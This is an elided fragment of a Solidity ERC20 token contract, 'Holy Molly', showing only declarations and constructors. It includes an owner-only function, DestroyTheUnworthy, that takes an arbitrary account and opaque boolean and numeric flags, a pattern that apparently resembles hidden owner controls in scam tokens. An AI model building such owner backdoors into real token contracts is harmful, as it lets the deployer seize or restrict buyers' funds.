...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function DestroyTheUnworthy(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _CreateTheUniverse(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Holy is Context, ERC20 {
    constructor(
        ...
        _CreateTheUniverse(owner, initialSupply, house6, house7);
    }
}

contract HolyMolly is ERC20Holy {
    constructor() ERC20Holy("Holy Molly", "HolyMolly", false, true, 900, 25, msg.sender, 2000000000 * 10 ** 18, msg.sender, 20) {
    }
}